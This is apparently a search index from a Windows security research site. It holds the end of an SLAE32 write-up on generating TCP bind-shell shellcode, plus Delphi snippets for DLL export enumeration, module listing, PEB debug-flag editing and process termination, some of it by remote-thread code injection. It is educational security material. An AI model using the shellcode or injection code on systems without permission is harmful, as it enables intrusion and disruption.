\u0026quot;// Shellcode size = {}\\n\u0026quot;.format(int(len(shellcode) / 4)) final_payload += \u0026quot;unsigned char code[] = \\\\\\n\u0026quot; for l in wrap(shellcode, 64): final_payload += \u0026quot;\\t\\\u0026quot;{}\\\u0026quot;\\n\u0026quot;.format(l) final_payload = final_payload[:-1] + \u0026quot;;\u0026quot; print(final_payload) Usage user@local:$ python3 ./gen_bindshell.py 1403\nor\nuser@local:$ chmod +x gen_bindshell.py \u0026amp;\u0026amp; ./gen_bindshell.py 1403\nReplace output content to SLAE32 C shellcode.c template and see what happens when varying port number.\nExercise Solution Github Repository https://github.com/DarkCoderSc/tcp-bindshell-shellcode-slae32\ngit clone https://github.com/DarkCoderSc/tcp-bindshell-shellcode-slae32.git\nAfterword Creating a TCP bindshell shellcode is straightforward but not an easy task.\nIt requires a solid comprehension of shellcoding and assembly throughout all steps. On the 7th exercises for passing the SLAE32 certification this is probably the most exausting part both for solving the challenge and explaning through this paper.\nTCP Bindshells are not always the best choice because of privilege lacking / port filtering etc.. Using reverse shell is often a more effective and realistic technique and coincidentally it is the subject of next exercise 😊\n"});index.add({'id':26,'href':'/docs/windows/projects/opensource/dll-export-enum/','title':"DLL Export Enum v1.0 (Open Source + Signed Binary)",'content':"This project is mainly created to demonstrate how to use the previously released unit UntEnumDLLExport.pas available \u0026gt; Here\nThe project is open source (see below for github link) and for those who don\u0026rsquo;t have Delphi installed, you can download the compiled and code signed application (both 32 and 64bit).\nAvailable Features  Enumerate Exported Functions From DLL.  Support Ordinal Value Only. Display Function Address and Relative Address. Support Forwarded Function. Support both 32 and 64bit binaries.   Load DLL from open dialog. List process modules to load attached DLL. Export list to file.  Important Notices   You can\u0026rsquo;t list process modules if target process is elevated but not DLL Export Enum application.\n  You can\u0026rsquo;t list process modules if target process is 64bit but DLL Export Enum application is a 32bit image. 64bit to 32bit is fine tho.\n   Screenshots Download Links Download (32/64)  Souce Code (Delphi)\ngit clone https://github.com/DarkCoderSc/dll-export-list.git\n"});index.add({'id':27,'href':'/docs/windows/projects/opensource/','title':"Open Source",'content':"Open Source Projects Sections   DLL Export Enum v1.0 Update PEB Debug Flag (Delphi) EOF Reader (C++)  "});index.add({'id':28,'href':'/docs/windows/snippets/delphi/enum-dll-exported-functions/','title':"Enum DLL Exported Functions",'content':"This unit demonstrate how to enumerate DLL exported functions through PE Header manipulation.\nFeatures  Support both 32 and 64bit DLL\u0026rsquo;s. Identify exported function names. Identify exported function ordinal value. Support and resolve forwarded function. Identify export function address and relative address.  Unit Code (******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ License: -\u0026gt; MIT *******************************************************************************) unit UntEnumDLLExport; interface uses Classes, Windows, Generics.Collections, SysUtils; type TExportEntry = class private FName : String; FForwarded : Boolean; FForwardName : String; FRelativeAddr : Cardinal; FAddress : Int64; FOrdinal : Word; {@M} function GetFormatedAddress() : String; function GetFormatedRelativeAddr() : String; public {@C} constructor Create(); {@G/S} property Name : String read FName write FName; property Forwarded : Boolean read FForwarded write FForwarded; property ForwardName : String read FForwardName write FForwardName; property Address : Int64 read FAddress write FAddress; property RelativeAddr : Cardinal read FRelativeAddr write FRelativeAddr; property Ordinal : Word read FOrdinal write FOrdinal; {@G} property FormatedAddress : String read GetFormatedAddress; property FormatedRelativeAddress : String read GetFormatedRelativeAddr; end; TEnumDLLExport = class private FItems : TObjectList\u0026lt;TExportEntry\u0026gt;; FFileName : String; {@M} public {@C} constructor Create(AFileName : String); destructor Destroy(); override; {@M} function Enum() : Integer; {@G} property Items : TObjectList\u0026lt;TExportEntry\u0026gt; read FItems; property FileName : String read FFileName; end; implementation {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ Local Functions +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} function IntToHexF(AValue : Int64; APad : Word = 0 {0=Auto}) : String; begin if (APad = 0) then begin if (AValue \u0026lt;= High(Word)) then APad := 2 else if (AValue \u0026lt;= High(DWORD)) and (AValue \u0026gt; High(Word)) then APad := 8 else if (AValue \u0026lt;= High(Int64)) and (AValue \u0026gt; High(DWORD)) then APad := 16; end; result := '0x' + IntToHex(AValue, APad); end; {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ TExportEntry +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} constructor TExportEntry.Create(); begin FName := ''; FForwarded := False; FForwardName := ''; FAddress := 0; FRelativeAddr := 0; FOrdinal := 0; end; function TExportEntry.GetFormatedAddress() : String; begin result := IntToHexF(FAddress {AUTO}); end; function TExportEntry.GetFormatedRelativeAddr() : String; begin result := IntToHexF(FRelativeAddr, (SizeOf(FRelativeAddr) * 2)); end; {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ TEnumPEExport +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} constructor TEnumDLLExport.Create(AFileName : String); begin FItems := TObjectList\u0026lt;TExportEntry\u0026gt;.Create(True); FFileName := AFileName; end; destructor TEnumDLLExport.Destroy(); begin if Assigned(FItems) then FreeAndNil(FItems); /// inherited Destroy(); end; { ERROR_CODES: ------------------------------------------------------------------------------ -99 : Unknown. -1 : Could not open file. -2 : Could not read image dos header. -3 : Invalid or corrupted PE File. -4 : Could not read nt header signature. -5 : Could not read image file header. -6 : Could not read optional header. -7 : Could not retrieve entry export address. -8 : Could not read export directory. -9 : No exported functions. } function TEnumDLLExport.Enum() : Integer; var hFile : THandle; dwBytesRead : Cardinal; AImageDosHeader : TImageDosHeader; AImageNtHeaderSignature : DWORD; x64Binary : Boolean; AImageFileHeader : TImageFileHeader; AImageOptionalHeader32 : TImageOptionalHeader32; AImageOptionalHeader64 : TImageOptionalHeader64; AExportAddr : TImageDataDirectory; AExportDir : TImageExportDirectory; I : Integer; ACanCatchSection : Boolean; AOffset : Cardinal; AExportName : AnsiString; ALen : Cardinal; AOrdinal : Word; AFuncAddress : Cardinal; AImageBase : UInt64; AExportEntry : TExportEntry; AForwarded : Boolean; AForwardName : AnsiString; AImportVirtualAddress : Cardinal; function RVAToFileOffset(ARVA : Cardinal) : Cardinal; var I : Integer; AImageSectionHeader : TImageSectionHeader; ASectionsOffset : Cardinal; begin result := 0; /// if (ARVA = 0) or (NOT ACanCatchSection) then Exit(); /// ASectionsOffset := ( AImageDosHeader._lfanew + SizeOf(DWORD) + SizeOf(TImageFileHeader) + AImageFileHeader.SizeOfOptionalHeader ); for I := 0 to (AImageFileHeader.NumberOfSections -1) do begin SetFilePointer(hFile, ASectionsOffset + (I * SizeOf(TImageSectionHeader)), nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageSectionHeader, SizeOf(TImageSectionHeader), dwBytesRead, 0) then continue; if (ARVA \u0026gt;= AImageSectionHeader.VirtualAddress) and (ARVA \u0026lt; AImageSectionHeader.VirtualAddress + AImageSectionHeader.SizeOfRawData) then result := (ARVA - AImageSectionHeader.VirtualAddress + AImageSectionHeader.PointerToRawData); end; end; { Read file from a starting offset to a null character. } function GetStringLength(AStartAtPos : Cardinal) : Cardinal; var ADummy : Byte; begin result := 0; /// if (hFile = INVALID_HANDLE_VALUE) then Exit(); SetFilePointer(hFile, AStartAtPos, nil, FILE_BEGIN); while True do begin if NOT ReadFile(hFile, ADummy, SizeOf(Byte), dwBytesRead, nil) then break; /// if (ADummy = 0) then break; Inc(result); end; end; begin result := -99; // Failed /// if NOT Assigned(FItems) then Exit(); FItems.Clear(); ACanCatchSection := False; { Read PE Header to reach Export List } hFile := CreateFileW(PWideChar(FFileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0); if hFile = INVALID_HANDLE_VALUE then Exit(-1); /// try if NOT ReadFile(hFile, AImageDosHeader, SizeOf(TImageDosHeader), dwBytesRead, 0) then Exit(-2); /// if (AImageDosHeader.e_magic \u0026lt;\u0026gt; IMAGE_DOS_SIGNATURE) then Exit(-3); // Not a valid PE File /// SetFilePointer(hFile, AImageDosHeader._lfanew, nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageNtHeaderSignature, SizeOf(DWORD), dwBytesRead, 0) then Exit(-4); /// if (AImageNTHeaderSignature \u0026lt;\u0026gt; IMAGE_NT_SIGNATURE) then Exit(-3); /// SetFilePointer(hFile, (AImageDosHeader._lfanew + sizeOf(DWORD)), nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageFileHeader, SizeOf(TImageFileHeader), dwBytesRead, 0) then Exit(-5); /// ACanCatchSection := True; x64Binary := (AImageFileHeader.Machine = IMAGE_FILE_MACHINE_AMD64); if x64Binary then begin if NOT ReadFile(hFile, AImageOptionalHeader64, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead, 0) then Exit(-6); end else begin if NOT ReadFile(hFile, AImageOptionalHeader32, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead, 0) then Exit(-6); end; /// AExportAddr.VirtualAddress := 0; AExportAddr.Size := 0; if x64Binary then begin AExportAddr := AImageOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; AImageBase := AImageOptionalHeader64.ImageBase; AImportVirtualAddress := AImageOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; end else begin AExportAddr := AImageOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; AImageBase := AImageOptionalHeader32.ImageBase; AImportVirtualAddress := AImageOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; end; AOffset := RVAToFileOffset(AExportAddr.VirtualAddress); if AOffset = 0 then Exit(-7); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AExportDir, SizeOf(TImageExportDirectory), dwBytesRead, 0) then Exit(-8); /// if (AExportDir.NumberOfFunctions \u0026lt;= 0) then Exit(-9); /// { Enumerate Named Exported Functions } for I := 0 to AExportDir.NumberOfNames - 1 do begin { Get Exported Ordinal } AOffset := RVAToFileOffset(AExportDir.AddressOfNameOrdinals) + (I * SizeOf(Word)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AOrdinal, SizeOf(Word), dwBytesRead, 0) then continue; // Ignore this entry /// { Get Exported Function Address } AOffset := RVAToFileOffset(AExportDir.AddressOfFunctions) + (AOrdinal * SizeOf(Cardinal)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AFuncAddress, SizeOf(Cardinal), dwBytesRead, 0) then continue; // Ignore this entry { Get Exported Function Name } AOffset := RVAToFileOffset(AExportDir.AddressOfNames) + (I * SizeOf(Cardinal)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AOffset, SizeOf(Cardinal), dwBytesRead, 0) then continue; // Ignore this entry /// ALen := GetStringLength(RVAToFileOffset(AOffset)); SetLength(AExportName, ALen); SetFilePointer(hFile, RVAToFileOffset(AOffset), nil, FILE_BEGIN); if NOT ReadFile(hFile, AExportName[1], ALen, dwBytesRead, nil) then continue; // Ignore this entry { Is Function Forwarded ? If yes, we catch its name } AForwarded := (AFuncAddress \u0026gt; RVAToFileOffset(AExportAddr.VirtualAddress)) and (AFuncAddress \u0026lt;= AImportVirtualAddress); if AForwarded then begin ALen := GetStringLength(RVAToFileOffset(AFuncAddress)); SetFilePointer(hFile, RVAToFileOffset(AFuncAddress), nil, FILE_BEGIN); SetLength(AForwardName, ALen); if NOT ReadFile(hFile, AForwardName[1], ALen, dwBytesRead, nil) then continue; // Ignore this entry end; { Create and append a new export entry } AExportEntry := TExportEntry.Create(); AExportEntry.Name := AExportName; AExportEntry.Ordinal := (AOrdinal + AExportDir.Base); AExportEntry.RelativeAddr := AFuncAddress; AExportEntry.Address := (AImageBase + AFuncAddress); AExportEntry.Forwarded := AForwarded; AExportEntry.ForwardName := AForwardName; FItems.Add(AExportEntry); end; /// result := FItems.Count; finally CloseHandle(hFile); end; end; end. "});index.add({'id':29,'href':'/docs/windows/snippets/delphi/get-process-name-method-1/','title':"Get Process Name Method 1",'content':"This one possible technique (through QueryFullProcessImageNameW) to get process image path from it id.\nThis example support Windows Vista to latest Windows version (Actually Windows 10)\nI will cover other example progressively and compatible with Windows XP and below.\n// Jean-Pierre LESUEUR (@DarkCoderSc) //... uses Windows, SysUtils; //... function GetProcessName(AProcessID : Cardinal) : String; var hProc : THandle; ALength : DWORD; hDLL : THandle; QueryFullProcessImageNameW : function( AProcess: THANDLE; AFlags: DWORD; AFileName: PWideChar; var ASize: DWORD): BOOL; stdcall; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// if (TOSVersion.Major \u0026lt; 6) then Exit(); /// QueryFullProcessImageNameW := nil; hDLL := LoadLibrary('kernel32.dll'); if hDLL = 0 then Exit(); try @QueryFullProcessImageNameW := GetProcAddress(hDLL, 'QueryFullProcessImageNameW'); /// if Assigned(QueryFullProcessImageNameW) then begin hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessID); if hProc = 0 then exit; try ALength := (MAX_PATH * 2); SetLength(result, ALength); if NOT QueryFullProcessImageNameW(hProc, 0, @result[1], ALength) then Exit(); SetLength(result, ALength); // Get rid of extra junk finally CloseHandle(hProc); end; end; finally FreeLibrary(hDLL); end; end; "});index.add({'id':30,'href':'/docs/windows/snippets/delphi/enum-modules-method-1/','title':"Enum Modules Method 1",'content':"You will find below an example of how to enumerate process modules using the well known Windows API CreateToolHelp32Snapshot(), I will cover additional methods soon.\nYou may notice that when using CreateToolHelp32Snapshot(), first result (row) is generally the Image Path of the process owning module. I ignore that row by checking the value of szExePath with owner process image path.\nGetProcessName() is compatible since Windows Vista. It is possible to support Windows XP and below but not in this example.\nYou will find GetProcessName() and alternatives in separated snippets threads.\n(******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ License: -\u0026gt; MIT *******************************************************************************) unit UntEnumModules; interface uses Classes, Windows, tlHelp32, SysUtils, Generics.Collections, psAPI; function EnumModules(ATargetProcessID : Cardinal) : TList\u0026lt;TModuleEntry32\u0026gt;; implementation {------------------------------------------------------------------------------- One possible method to get process image path from process id. Doesn't support Windows XP and below, Windows XP is dead :-( - One technique would be to use GetModuleFileNameExW() -------------------------------------------------------------------------------} function GetProcessName(AProcessID : Cardinal) : String; var hProc : THandle; ALength : DWORD; hDLL : THandle; QueryFullProcessImageNameW : function( AProcess: THANDLE; AFlags: DWORD; AFileName: PWideChar; var ASize: DWORD): BOOL; stdcall; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// if (TOSVersion.Major \u0026lt; 6) then Exit(); /// QueryFullProcessImageNameW := nil; hDLL := LoadLibrary('kernel32.dll'); if hDLL = 0 then Exit(); try @QueryFullProcessImageNameW := GetProcAddress(hDLL, 'QueryFullProcessImageNameW'); /// if Assigned(QueryFullProcessImageNameW) then begin hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessID); if hProc = 0 then exit; try ALength := (MAX_PATH * 2); SetLength(result, ALength); if NOT QueryFullProcessImageNameW(hProc, 0, @result[1], ALength) then Exit(); SetLength(result, ALength); // Get rid of extra junk finally CloseHandle(hProc); end; end; finally FreeLibrary(hDLL); end; end; { Enumerate target process modules (Loaded DLL's) } function EnumModules(ATargetProcessID : Cardinal) : TList\u0026lt;TModuleEntry32\u0026gt;; var ASnap : THandle; AModuleEntry : TModuleEntry32; AOwnerPath : String; const TH32CS_SNAPMODULE32 = $00000010; procedure Append(); begin if AOwnerPath.ToLower = String(AModuleEntry.szExePath).ToLower then Exit(); // Ignore result.Add(AModuleEntry); end; begin result := TList\u0026lt;TModuleEntry32\u0026gt;.Create(); /// AOwnerPath := GetProcessName(ATargetProcessId); ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPMODULE or TH32CS_SNAPMODULE32, ATargetProcessId); if ASnap = INVALID_HANDLE_VALUE then begin Exit; end; try ZeroMemory(@AModuleEntry, SizeOf(TModuleEntry32)); AModuleEntry.dwSize := SizeOf(TModuleEntry32); /// if NOT Module32First(ASnap, AModuleEntry) then begin Exit(); end; Append(); while True do begin ZeroMemory(@AModuleEntry, SizeOf(TModuleEntry32)); AModuleEntry.dwSize := SizeOf(TModuleEntry32); /// if NOT Module32Next(ASnap, AModuleEntry) then begin Break; end; Append(); end; finally CloseHandle(ASnap); end; end; end. "});index.add({'id':31,'href':'/docs/windows/snippets/delphi/terminate-process-techniques/','title':"Terminate Process Techniques",'content':"You will find below 4 different techniques to close/kill/terminate Windows process in pure WinAPI.\nTechniques  TerminateProcess() : Classic method. ExitProcess() : via Code Injection (32bit to 32bit ; 64bit to 64bit). Crash Process : Inject code that will crash the process (32bit to 32bit ; 64bit to 64bit). CTRL_CLOSE_EVENT / WM_CLOSE : Send \u0026ldquo;close\u0026rdquo; messages to target process windows.  TerminateAProcess() Method Kill target process id following desired method : tmpAll, tpmTerminateProcess, tpmExitProcess, tpmCrash, tpmMessage\ntmpAll attempt to kill process from cleanest way to dirtiest way until it succeed.\nCode { Jean-Pierre LESUEUR (@DarkCoderSc) } /// ... uses Windows, SysUtils, tlhelp32; /// ... type TTerminateProcessMethod = ( tmpAll, tpmTerminateProcess, tpmExitProcess, tpmCrash, tpmMessage ); { Detect if a process id exists using the CreateToolHelp32Snapshot method from tlhelp32 lib. } function TLHelp32_ProcessIdExists(AProcessId : Cardinal) : Boolean; var ASnapshot : THandle; AProcessEntry : TProcessEntry32; begin result := false; /// ASnapshot := CreateToolHelp32Snapshot(TH32CS_SNAPALL, 0); if ASnapshot = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AProcessEntry, sizeOf(TProcessEntry32)); AProcessEntry.dwSize := sizeOf(TProcessEntry32); if NOT Process32First(ASnapshot, AProcessEntry) then Exit(); if (AProcessId = AProcessEntry.th32ProcessID) then begin result := true; end else begin while true do begin ZeroMemory(@AProcessEntry, sizeOf(TProcessEntry32)); AProcessEntry.dwSize := sizeOf(TProcessEntry32); if NOT Process32Next(ASnapshot, AProcessEntry) then break; if (AProcessId = AProcessEntry.th32ProcessID) then begin result := true; break; end; end; end; finally CloseHandle(ASnapshot); end; end; { Method 1 : Terminate a process through TerminateProcess API. IMOO the cleanest way if it isn't a graphical application. } function TerminateProcess_TerminateProcess(AProcessID : Cardinal) : Boolean; var hProc : THandle; begin result := false; hProc := OpenProcess(PROCESS_TERMINATE, false, AProcessID); if (hProc = 0) then Exit(); try if NOT WinAPI.Windows.TerminateProcess(hProc, 0) then Exit(); result := true; finally CloseHandle(hProc); end; end; { Method 2 : Terminate Process through code injection on target process. This method works if both process (injecter and target) are using same process architecture. } function TerminateProcess_ExitProcess(AProcessID : Cardinal) : Boolean; var hProc : THandle; pExitProcess : Pointer; hRemoteThread : THandle; dwThreadId : Cardinal; Arg : Integer; begin result := false; /// SetLastError(0); pExitProcess := GetProcAddress(LoadLibrary('kernel32.dll'), 'ExitProcess'); if (GetLastError() \u0026lt;\u0026gt; 0) then begin exit; end; hProc := OpenProcess(PROCESS_CREATE_THREAD or PROCESS_VM_OPERATION or PROCESS_VM_WRITE, false, AProcessID); if (hProc = 0) then Exit(); try Arg := 0; // EXIT VALUE hRemoteThread := CreateRemoteThread(hProc, nil, 0, pExitProcess, @Arg, 0, dwThreadId); if (hRemoteThread = 0) then Exit(); WaitForSingleObject(hRemoteThread, INFINITE); // WAIT UNTIL REMOTE THREAD HAS END result := true; finally CloseHandle(hProc); end; end; { Method 3 : Terminate process by crashing target process with an access violation. This is not a recommended solution but still worth testing. } function TerminateProcess_Crash(AProcessID : Cardinal) : Boolean; var hProc : THandle; dwThreadId : Cardinal; hRemoteThread : THandle; begin hProc := OpenProcess(PROCESS_CREATE_THREAD or PROCESS_VM_OPERATION or PROCESS_VM_WRITE, false, AProcessID); if (hProc = 0) then Exit; try hRemoteThread := CreateRemoteThread(hProc, nil, 0, Pointer(-1), nil, 0, dwThreadId); if (hRemoteThread = 0) then Exit(); result := true; finally CloseHandle(hProc); end; end; { Method 4 : Terminate process via sending close event messages. IMOO the best method for process with GUI. } function _EnumWindowProc(AHwnd : HWND; param : LParam): BOOL; stdcall; var AProcessID : Cardinal; begin result := true; /// if AHwnd = 0 then Exit(); GetWindowThreadProcessId(AHwnd, @AProcessID); if PCardinal(param)^ \u0026lt;\u0026gt; AProcessID then Exit(); SendMessage(AHwnd, CTRL_CLOSE_EVENT, 0, 0); SendMessage(AHwnd, WM_CLOSE, 0, 0); end; function TerminateProcess_SendMessage(AProcessID : Cardinal) : boolean; begin result := false; /// SetLastError(0); if NOT EnumWindows(@_EnumWindowProc, LPARAM(@AProcessID)) then begin exit; end; if TLHelp32_ProcessIdExists(AProcessID) then Exit; /// result := true; end; { Dispatach desired terminate process method. } function TerminateProcess(AProcessID : Cardinal; AMethod : TTerminateProcessMethod = tpmTerminateProcess) : Boolean; begin result := false; /// if NOT TLHelp32_ProcessIdExists(AProcessID) then Exit(); case AMethod of tmpAll : begin TerminateProcess_SendMessage(AProcessID); if NOT result then TerminateProcess_TerminateProcess(AProcessID); if NOT result then TerminateProcess_ExitProcess(AProcessID); if NOT result then TerminateProcess_Crash(AProcessID); end; tpmTerminateProcess : result := TerminateProcess_TerminateProcess(AProcessID); tpmExitProcess : result := TerminateProcess_ExitProcess(AProcessID); tpmCrash : result := TerminateProcess_Crash(AProcessID); tpmMessage : result := TerminateProcess_SendMessage(AProcessID); end; end; "});index.add({'id':32,'href':'/docs/windows/projects/opensource/update-peb-debug-delphi/','title':"Update PEB Debug Flag (Delphi)",'content':"This project implement the unit UntPEBDebug.pas with a concreate example.\nFeatures Include  List process and their Debug status. (ReadProcessMemory / PEB method) Update process Debug flag. (WriteProcessMemory / PEB method) Support both 32bit and 64bit. Notice.  Notice regarding architecture:\n To target 32bit process, you must use the project compiled as 32bit executable. To target 64bit process, you must use the project compiled as 64bit executable.  Repository git clone https://github.com/DarkCoderSc/peb-update-debug-flag.git\nProject available at : https://github.com/DarkCoderSc/peb-update-debug-flag\nScreenshot Main Code Preview (******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ License: -\u0026gt; MIT *******************************************************************************) program PEBDebug; {$APPTYPE CONSOLE} {$R *.res} uses System.SysUtils, Windows, tlHelp32, Generics.Collections, UntPEBDebug in 'UntPEBDebug.pas'; type TArchitecture = (x86, x64, xUnknown); { Detect target process architecture. } function IsProcessX64(AProcessId : Cardinal) : TArchitecture; var AProcHandle : THandle; AWow64Process : bool; begin result := xUnknown; /// { If we are not in a 64Bit system then we are for sure in a 32Bit system } if (TOSVersion.Architecture = arIntelX86) then Exit(); /// AProcHandle := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, AProcessId); if AProcHandle = 0 then Exit; try isWow64Process(AProcHandle, AWow64Process); /// if AWow64Process then result := x86 else result := x64; finally CloseHandle(AProcHandle); end; end; { Retrieve the list of running process for scanning PEB value. } function EnumProcess(AFilterSameArch : Boolean = False) : TDictionary\u0026lt;Integer {Process Id}, String {Process Name}\u0026gt;; var ASnap : THandle; AProcessEntry : TProcessEntry32; AProcessName : String; procedure AppendEntry(); begin if AFilterSameArch and ((IsProcessX64(GetCurrentProcessId())) \u0026lt;\u0026gt; (IsProcessX64(AProcessEntry.th32ProcessID))) then Exit(); /// result.Add(AProcessEntry.th32ProcessID, AProcessEntry.szExeFile); end; begin result := TDictionary\u0026lt;Integer, String\u0026gt;.Create(); /// ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0); if ASnap = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32First(ASnap, AProcessEntry) then Exit(); AppendEntry(); while True do begin ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32Next(ASnap, AProcessEntry) then break; AppendEntry(); end; finally CloseHandle(ASnap); end; end; { Display Process Debug Status Feature. } procedure DoListProcessDebugStatus(); var ADebugStatus : Boolean; AProcessName : String; AProcessId : Cardinal; AProcessList : TDictionary\u0026lt;Integer, String\u0026gt;; ADebugStatusStr : String; begin WriteLn('Process List (Only with same architecture) :'); /// AProcessList := EnumProcess(True); try for AProcessId in AProcessList.Keys do begin if NOT AProcessList.TryGetValue(AProcessId, AProcessName) then continue; /// if GetProcessDebugStatus(AProcessId, ADebugStatus) then begin if ADebugStatus then ADebugStatusStr := 'True' else ADebugStatusStr := 'False'; writeln(#09 + Format('* Debug=[%s], %s(%d)', [ADebugStatusStr, AProcessName, AProcessId])); end; end; finally if Assigned(AProcessList) then FreeAndNil(AProcessList); end; Writeln(#13#10); end; { Show different option of that tool } function DisplayMenu() : Integer; var AChoice : String; begin result := 0; /// WriteLn('Choose an option:'); WriteLn('--------------------------------------------' + #13#10); WriteLn(#09 + '* [1] : List process debug flag'); WriteLn(#09 + '* [2] : Set process debug flag to true'); WriteLn(#09 + '* [3] : Set process debug flag to false'); WriteLn(#09 + '* [4] : Quit'); Writeln(#13#10); Write('Option : '); ReadLn(AChoice); Writeln(#13#10); if NOT TryStrToInt(AChoice, result) then result := 0; end; { Update Target Process Debug Flag } procedure UpdateTargetProcessDebugFlag(ADebugStatus : Boolean); var AChoice : String; AProcessId : Integer; begin Write('Enter target process id :'); ReadLn(AChoice); if NOT TryStrToInt(AChoice, AProcessId) then WriteLn('Invalid Process Id') else begin if AProcessId \u0026lt;= 0 then WriteLn('Invalid Process Id') else begin if SetProcessDebugStatus(AProcessId, ADebugStatus) then begin WriteLn('Done.'); end else begin WriteLn('Failed. Possible reasons: \u0026quot;Non existing process id\u0026quot;, \u0026quot;Not enough privilege\u0026quot;, \u0026quot;Wrong architecture\u0026quot;'); end; end; end; WriteLn(''); end; var AChoice : Byte; begin try while True do begin AChoice := DisplayMenu(); /// case AChoice of 1 : begin DoListProcessDebugStatus(); end; 2 : begin UpdateTargetProcessDebugFlag(True); end; 3 : begin UpdateTargetProcessDebugFlag(False); end; 4 : begin Break; end; end; end; except on E: Exception do Writeln(E.ClassName, ': ', E.Message); end; end. "});index.add({'id':33,'href':'/docs/windows/snippets/delphi/update-peb-debug/','title':"Update PEB Debug Flag",'content':"Tiny delphi unit to get and update debug flag from PEB (Process Environment Block).\nThis unit was created while working on a friend project called Unprotect (@fr0gger_), https://github.com/fr0gger/unprotect\nIndeed, some Malware often check the value of Debug flag to know whether or not they are getting debugged and apply anti debug techniques if this is the case.\nExample of implementation can be found there\n(******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ License: -\u0026gt; MIT *******************************************************************************) unit UntPEBDebug; interface uses Windows; const PROCESS_QUERY_LIMITED_INFORMATION = $1000; PROCESS_BASIC_INFORMATION = 0; // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess var _NtQueryInformationProcess : function( ProcessHandle : THandle; ProcessInformationClass : DWORD; ProcessInformation : Pointer; ProcessInformationLength : ULONG; ReturnLength : PULONG) : LongInt; stdcall; hNTDLL : THandle; {$IFDEF WIN64} type PProcessBasicInformation = ^TProcessBasicInformation; TProcessBasicInformation = record ExitStatus : Int64; PebBaseAddress : Pointer; AffinityMask : Int64; BasePriority : Int64; UniqueProcessId : Int64; InheritedUniquePID : Int64; end; {$ELSE} type PProcessBasicInformation = ^TProcessBasicInformation; TProcessBasicInformation = record ExitStatus : DWORD; PebBaseAddress : Pointer; AffinityMask : DWORD; BasePriority : DWORD; UniqueProcessId : DWORD; InheritedUniquePID : DWORD; end; {$ENDIF} function GetProcessDebugStatus(AProcessID : Cardinal; var ADebugStatus : boolean) : Boolean; function SetProcessDebugStatus(AProcessID : Cardinal; ADebugStatus : Boolean) : Boolean; implementation {------------------------------------------------------------------------------- Open a process and retrieve the point of debug flag from PEB. If function succeed, don't forget to call close process handle. -------------------------------------------------------------------------------} function GetDebugFlagPointer(AProcessID : Cardinal; var AProcessHandle : THandle) : Pointer; var PBI : TProcessBasicInformation; ARetLen : Cardinal; begin result := nil; /// AProcessHandle := 0; if NOT Assigned(_NtQueryInformationProcess) then Exit(); /// AProcessHandle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_WRITE or PROCESS_VM_READ, false, AProcessID); if (AProcessHandle = 0) then Exit; if _NtQueryInformationProcess(AProcessHandle, PROCESS_BASIC_INFORMATION, @PBI, sizeOf(TProcessBasicInformation), @ARetLen) = ERROR_SUCCESS then result := Pointer(NativeUInt(PBI.PebBaseAddress) + (SizeOf(Byte) * 2)) else CloseHandle(AProcessHandle); end; {------------------------------------------------------------------------------- Retrieve the target process debug status from PEB. ADebugStatus = True : Target process debug flag is set. ADebugStatus = False : Target process debug flag is not set. -------------------------------------------------------------------------------} function GetProcessDebugStatus(AProcessID : Cardinal; var ADebugStatus : boolean) : Boolean; var hProcess : THandle; pDebugFlagOffset : Pointer; pDebugFlag : pByte; ABytesRead : SIZE_T; begin result := false; /// pDebugFlagOffset := GetDebugFlagPointer(AProcessID, hProcess); if not Assigned(pDebugFlagOffset) then Exit(); /// try getMem(pDebugFlag, sizeOf(Byte)); try if NOT ReadProcessMemory(hProcess, pDebugFlagOffset, 